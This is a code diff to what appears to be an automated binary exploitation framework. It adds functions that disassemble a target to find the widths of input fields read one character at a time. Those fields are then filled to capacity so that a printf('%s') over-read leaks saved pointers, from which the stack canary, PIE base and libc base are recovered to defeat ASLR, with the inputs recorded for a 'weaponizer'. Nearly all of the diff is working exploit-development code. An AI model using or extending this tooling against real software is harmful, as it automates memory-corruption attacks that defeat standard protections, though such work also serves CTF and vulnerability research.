@@ -53,6 +53,60 @@ def read_sizes(target_bytes: bytes) -> list:
     return sizes
 
 
+def read_loop_caps(target_bytes: bytes) -> list:
+    """Best-effort sequence of CAPACITIES of char-at-a-time input fields: a `read(fd,&c,1)` inside a
+    loop bounded by `cmp $CAP,%reg ; jbe/jb` (the classic `for(i=0;i<=CAP;i++){read(0,&c,1); if
+    (c=='\\n')break; buf[i]=c;}`). Such a field is read one byte per call, so read_sizes sees only a
+    size of 1 and cannot tell the field's real width; the loop bound does. The width lets the driver
+    FILL a field exactly (send CAP+1 bytes with no newline so the loop stops at the cap and leaves no
+    residue) and -- by filling several adjacent fields -- BRIDGE a printf(\"%s\") over-read past the
+    buffer to a saved pointer. Returns caps (loop bound + 1 = bytes the field accepts) in code order;
+    empty on failure. A hint, not ground truth."""
+    import shutil
+    try:
+        objdump = shutil.which("objdump")
+        if not objdump:
+            return []
+        import tempfile
+        with tempfile.NamedTemporaryFile(suffix=".bin") as f:
+            f.write(target_bytes)
+            f.flush()
+            out = subprocess.run([objdump, "-d", f.name], capture_output=True, text=True,
+                                 timeout=30).stdout
+    except Exception:
+        return []
+    lines = out.splitlines()
+    read1_at = []                                        # indices of `call read@plt` with size==1
+    pend = None
+    for i, ln in enumerate(lines):
+        m = re.search(r"mov\s+\$0x([0-9a-f]+),%edx", ln)
+        if m:
+            pend = int(m.group(1), 16)
+        elif "call" in ln and "read@plt" in ln:
+            if pend == 1:
+                read1_at.append(i)
+            pend = None
+    caps = []
+    for idx in read1_at:
+        # the loop's upper bound is a `cmp $CAP, <counter>` feeding the loop back-branch a few insns
+        # after the read. The counter may be a register OR a memory slot (-0x4(%rbp)), and the branch
+        # may be signed (jle/jl) or unsigned (jbe/jb) depending on the counter's type. EXCLUDE je/jne
+        # -- that is the `if (c=='\n')` terminator compare, not the bound. An "or-equal" branch
+        # (jle/jbe) means i runs 0..CAP inclusive -> CAP+1 bytes; a strict one (jl/jb) -> CAP bytes.
+        cap = None
+        for j in range(idx, min(idx + 28, len(lines))):
+            cm = re.search(r"\bcmp[lqwb]?\s+\$0x([0-9a-f]+),", lines[j])
+            if not cm or j + 1 >= len(lines):
+                continue
+            bm = re.search(r"\b(jbe|jb|jle|jl|jae|ja|jge|jg)\b", lines[j + 1])
+            if bm:
+                n = int(cm.group(1), 16)
+                cap = n + 1 if bm.group(1) in ("jbe", "jle", "jae", "jge") else n
+                break
+        caps.append(cap if cap is not None else 1)
+    return caps
+
+
 def _spawn(exe: Path, workdir: Path):
     rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
     cmd = sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)],
@@ -144,6 +198,70 @@ def _bases_from(out: bytes, target_bytes: bytes, libc_data: bytes, fill: bytes) 
             "pie_base": cls.get("pie_base"), "libc_base": cls.get("libc_base")}
 
 
+def _drive_bridge(exe, workdir, caps, *, timeout, max_steps=12):
+    """Drive the prompt sequence FILLING every char-loop field to capacity so a later printf(\"%s\")
+    over-read bridges past the buffer. Each str prompt gets `caps[j]` non-NUL bytes with NO newline
+    (the read(1) loop stops at its cap, leaving no residue); each num prompt gets a large non-zero
+    value (so an adjacent %s does not stop on a zeroed number field). Returns (output, recipe) where
+    recipe is the exact writes sent -- a weaponizer replays it to re-reach the leak/overflow."""
+    p = _spawn(exe, workdir)
+    out = b""
+    recipe = []
+    ci = 0
+    try:
+        sel = selectors.DefaultSelector()
+        sel.register(p.stdout, selectors.EVENT_READ)
+        end = time.monotonic() + timeout
+        for _ in range(max_steps):
+            if time.monotonic() >= end:
+                break
+            o, alive = menu._drain(p, sel, idle=0.2, deadline=min(end, time.monotonic() + 2.0))
+            out += o.encode("latin1") if isinstance(o, str) else (o or b"")
+            if not alive:
+                break
+            if _classify_last(out) == "num":
+                w = b"-1\n"                               # scanf -> 0xff..ff: 8 non-zero bridge bytes
+            else:
+                # positional cap when loops are inlined (one per field); clamp to the last known cap
+                # when a single shared read(1) helper serves every field (all the same width).
+                cap = caps[ci] if ci < len(caps) else (caps[-1] if caps else 64)
+                ci += 1
+                w = b"B" * cap                            # fill to the loop cap, no newline, no residue
+            recipe.append(w)
+            try:
+                p.stdin.write(w)
+                p.stdin.flush()
+            except (BrokenPipeError, OSError):
+                break
+        o, _ = menu._drain(p, sel, idle=0.2, deadline=min(end, time.monotonic() + 2.0))
+        out += o.encode("latin1") if isinstance(o, str) else (o or b"")
+    finally:
+        try:
+            p.kill()
+        except Exception:                                # noqa: BLE001
+            pass
+    return out, recipe
+
+
+def _bases_bridge(out: bytes, target_bytes: bytes, libc_data: bytes) -> dict:
+    """Recover bases from a BRIDGE over-read where the leak is a lone truncated image pointer. A
+    printf(\"%s\") that runs off the buffer prints a saved pointer up to its NUL high bytes, so the
+    pointer appears as a 6-byte little-endian run (byte 5 is 0x55/0x56 image or 0x7f libc/stack) that
+    _le_pointer_words (8-byte, NUL-terminated) misses. Harvest those runs, then pin the PIE base from
+    a SINGLE unambiguous anchor (allow_single) since a %s cannot leak a second pointer past the NUL."""
+    from .poc import exploit as _exploit
+    vals = list(_leak._le_pointer_words(out))
+    for i in range(0, len(out) - 5):                     # 6-byte truncated LE pointer runs
+        if out[i + 5] in (0x7F, 0x55, 0x56):
+            vals.append(int.from_bytes(out[i:i + 6], "little"))
+    cls = _leak.classify_leak(vals, target_bytes, libc_data)
+    pie = cls.get("pie_base") or _exploit.recover_pie_base(vals, target_bytes, allow_single=True)
+    from .poc import rop as _rop
+    canary = _rop.find_canary(vals + _leak._le_canary_words(out))
+    return {"canary": canary, "canary_pos": None,
+            "pie_base": pie, "libc_base": cls.get("libc_base")}
+
+
 def drive_to_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=8.0,
                   max_steps=8, fills=(64, 96, 128, 200, 264), max_total=40.0) -> dict:
     """Drive the prompt sequence and sweep a non-NUL over-read fill across each input position and
@@ -174,6 +292,20 @@ def drive_to_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), ti
 
     def _score(b):
         return sum(1 for k in ("canary", "pie_base", "libc_base") if b.get(k))
+
+    # Bridge pass FIRST when the target reads fields char-at-a-time (read(1) loops): the single-fill
+    # sweep below sends a benign short answer to every other field, so a printf("%s") over-read stops
+    # at the first zeroed field and never reaches a saved pointer. Filling EVERY field to capacity
+    # bridges the over-read past the buffer. Cheap (one process), so try it before the sweep.
+    caps = read_loop_caps(target_bytes)
+    if caps:
+        out, recipe = _drive_bridge(exe, workdir, caps, timeout=timeout)
+        bases = _bases_bridge(out, target_bytes, libc_data)
+        if bases.get("pie_base") or bases.get("canary") or bases.get("libc_base"):
+            best = {**bases, "inject_at": None, "fill_len": None, "recipe": recipe}
+            best_score = _score(bases)
+            if bases.get("pie_base") or bases.get("libc_base"):
+                return best                              # a base defeats ASLR -> good enough to return
 
     # Total wall-clock budget: the sweep spawns a process per (position, length), so cap it so the
     # pass can never overrun the stage's own deadline.
